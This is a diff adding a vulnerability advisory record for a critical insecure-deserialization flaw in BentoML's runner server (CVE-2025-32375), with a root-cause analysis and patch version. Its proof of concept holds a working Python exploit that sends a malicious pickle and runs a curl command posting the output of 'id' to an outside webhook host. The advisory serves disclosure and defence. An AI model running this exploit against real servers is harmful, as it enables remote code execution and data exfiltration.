@@ -1,0 +1,56 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2025-04-09T12:59:46Z",
+  "Package": {
+    "Ecosystem": "PIP",
+    "Name": "bentoml"
+  },
+  "Advisory": {
+    "DatabaseId": 289278,
+    "Id": "GSA_kwCzR0hTQS03djRyLWM5ODkteGgyNs4ABGn-",
+    "GhsaId": "GHSA-7v4r-c989-xh26",
+    "References": [
+      {
+        "Url": "https://github.com/bentoml/BentoML/security/advisories/GHSA-7v4r-c989-xh26"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-32375"
+      },
+      {
+        "Url": "https://github.com/pypa/advisory-database/tree/main/vulns/bentoml/PYSEC-2025-32.yaml"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-7v4r-c989-xh26"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-7v4r-c989-xh26"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2025-32375"
+      }
+    ],
+    "Description": "### Summary\nThere was an insecure deserialization in BentoML's runner server. By setting specific headers and parameters in the POST request, it is possible to execute any unauthorized arbitrary code on the server, which will grant the attackers to have the initial access and information disclosure on the server.\n\n### PoC\n - First, create a file named **model.py** to create a simple model and save it\n```\nimport bentoml\nimport numpy as np\n\nclass mymodel:\n    def predict(self, info):\n        return np.abs(info)\n    def __call__(self, info):\n        return self.predict(info)\n\nmodel = mymodel()\nbentoml.picklable_model.save_model(\"mymodel\", model)\n```\n- Then run the following command to save this model\n```\npython3 model.py\n```\n- Next, create **bentofile.yaml** to build this model\n```\nservice: \"service.py\"  \ndescription: \"A model serving service with BentoML\"  \npython:\n  packages:\n    - bentoml\n    - numpy\nmodels:\n  - tag: MyModel:latest  \ninclude:\n  - \"*.py\"  \n```\n- Then, create **service.py** to host this model\n```\nimport bentoml\nfrom bentoml.io import NumpyNdarray\nimport numpy as np\n\n\nmodel_runner = bentoml.picklable_model.get(\"mymodel:latest\").to_runner()\n\nsvc = bentoml.Service(\"myservice\", runners=[model_runner])\n\nasync def predict(input_data: np.ndarray):\n\n    input_columns = np.split(input_data, input_data.shape[1], axis=1)\n    result_generator = model_runner.async_run(input_columns, is_stream=True)\n    async for result in result_generator:\n        yield result\n```\n- Then, run the following commands to build and host this model\n```\nbentoml build\nbentoml start-runner-server --runner-name mymodel --working-dir . --host 0.0.0.0 --port 8888\n```\n- Finally, run this below python script to exploit insecure deserialization vulnerability in BentoML's runner server.\n```\nimport requests\nimport pickle\n\nurl = \"http://0.0.0.0:8888/\"\n\nheaders = {\n    \"args-number\": \"1\",\n    \"Content-Type\": \"application/vnd.bentoml.pickled\",\n    \"Payload-Container\": \"NdarrayContainer\", \n    \"Payload-Meta\": '{\"format\": \"default\"}',\n    \"Batch-Size\": \"-1\",\n}\n\nclass P:\n    def __reduce__(self):\n        return  (__import__('os').system, ('curl -X POST -d \"$(id)\" https://webhook.site/61093bfe-a006-4e9e-93e4-e201eabbb2c3',))\n\nresponse = requests.post(url, headers=headers, data=pickle.dumps(P()))\n\nprint(response)\n```\nAnd I can replace the **NdarrayContainer** with **PandasDataFrameContainer** in **Payload-Container** header and the exploit still working.\nAfter running **exploit.py** then the output of the command **id** will be send out to the WebHook server.\n\n### Root Cause Analysis:\n\n- When handling a request in BentoML runner server in `src/bentoml/_internal/server/runner_app.py`, when the request header `args-number` is equal to 1, it will call the function `_deserialize_single_param` like the code below:\n```\nhttps://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L291-L298\nasync def _request_handler(request: Request) -\u003e Response:\n    assert self._is_ready\n\n    arg_num = int(request.headers[\"args-number\"])\n    r_: bytes = await request.body()\n\n    if arg_num == 1:\n        params: Params[t.Any] = _deserialize_single_param(request, r_)\n```\n- Then this is the function of `_deserialize_single_param`, which will take the value of all request headers of `Payload-Container`, `Payload-Meta` and `Batch-Size` and the crafted into `Payload` class which will contain the data from `request.body`\n```\nhttps://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L376-L393\ndef _deserialize_single_param(request: Request, bs: bytes) -\u003e Params[t.Any]:\n    container = request.headers[\"Payload-Container\"]\n    meta = json.loads(request.headers[\"Payload-Meta\"])\n    batch_size = int(request.headers[\"Batch-Size\"])\n    kwarg_name = request.headers.get(\"Kwarg-Name\")\n    payload = Payload(\n        data=bs,\n        meta=meta,\n        batch_size=batch_size,\n        container=container,\n    )\n    if kwarg_name:\n        d = {kwarg_name: payload}\n        params: Params[t.Any] = Params(**d)\n    else:\n        params: Params[t.Any] = Params(payload)\n\n    return params\n```\n- After crafting `Params` containing payload, it will call to function `infer` with `params` variable as input\n```\nhttps://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L303-L304\ntry:\n  payload = await infer(params)\n```\n- Inside function `infer`, the `params` variable with is belong to class `Params` will call the function `map` of that class with `AutoContainer.from_payload` as a parameter.\n```\nhttps://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L278-L289\nasync def infer(params: Params[t.Any]) -\u003e Payload:\n      params = params.map(AutoContainer.from_payload)\n\n      try:\n          ret = await runner_method.async_run(\n              *params.args, **params.kwargs\n          )\n      except Exception:\n          traceback.print_exc()\n          raise\n\n      return AutoContainer.to_payload(ret, 0)\n```\n- Inside class `Params` define the function `map` which will call the `AutoContainer.from_payload` function with arguments, which are `data`, `meta`, `batch_size` and `container`\n```\nhttps://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/utils.py#L59-L66\ndef map(self, function: t.Callable[[T], To]) -\u003e Params[To]:\n    \"\"\"\n    Apply a function to all the values in the Params and return a Params of the\n    return values.\n    \"\"\"\n    args = tuple(function(a) for a in self.args)\n    kwargs = {k: function(v) for k, v in self.kwargs.items()}\n    return Params[To](*args, **kwargs)\n```\n- Inside class `AutoContainer` class have defined the function `from_payload` which will find the class by the `payload.container` , which is the value of header `Payload-Container`, and it will call the function `from_payload` from the chosen class as return value\n```\nhttps://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/container.py#L710-L712\ndef from_payload(cls, payload: Payload) -\u003e t.Any:\n    container_cls = DataContainerRegistry.find_by_name(payload.container)\n    return container_cls.from_payload(payload)\n```\nAnd if the attacker set value of header `Payload-Container` to `NdarrayContainer` or `PandasDataFrameContainer`, it will call `from_payload` and when it then check if the `payload.meta[\"format\"] == \"default\"` it will call `pickle.loads(payload.data)` and `payload.meta[\"format\"]` is the value of header `Payload-Meta` and the attacker can set it to `{\"format\": \"default\"}` and `payload.data` is the value of `request.body` which is the payload from malicious `class P` in my request, which will trigger `__reduce__` method and then execute arbitrary commands (for my example is the `curl` command)\n```\nhttps://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/container.py#L411-L416\ndef from_payload(\n    cls,\n    payload: Payload,\n) -\u003e ext.PdDataFrame:\n    if payload.meta[\"format\"] == \"default\":\n        return pickle.loads(payload.data)\nhttps://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/container.py#L306-L312\ndef from_payload(\n    cls,\n    payload: Payload,\n) -\u003e ext.NpNDArray:\n    format = payload.meta.get(\"format\", \"default\")\n    if format == \"default\":\n        return pickle.loads(payload.data)\n```\n### Impact\nIn the above Proof of Concept, I have shown how the attacker can execute command **id** and send the output of the command to the outside. By replacing **id** command with any OS commands, this insecure deserialization in BentoML's runner server will grant the attacker the permission to gain the remote shell on the server and injecting backdoors to persist access.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2025-04-09T12:59:45Z",
+    "Severity": "CRITICAL",
+    "Summary": "BentoML's runner server Vulnerable to Remote Code Execution (RCE) via Insecure Deserialization",
+    "UpdatedAt": "2025-04-23T15:24:05Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 9.8,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.4.8"
+      },
+      "VulnerableVersionRange": "\u003e= 1.0.0a1, \u003c 1.4.8"
+    }
+  ]
+}
